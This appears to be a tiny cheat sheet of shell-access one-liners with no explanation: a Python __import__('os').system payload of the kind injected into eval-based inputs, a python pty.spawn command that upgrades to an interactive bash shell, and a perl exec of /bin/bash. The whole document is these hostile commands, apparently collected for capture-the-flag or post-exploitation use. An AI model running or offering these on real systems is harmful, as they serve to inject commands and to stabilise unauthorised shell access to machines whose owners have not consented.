__import__('os').system('ls')

python3 -c 'import pty;pty.spawn("/bin/bash")'

perl -e 'exec "/bin/bash";'
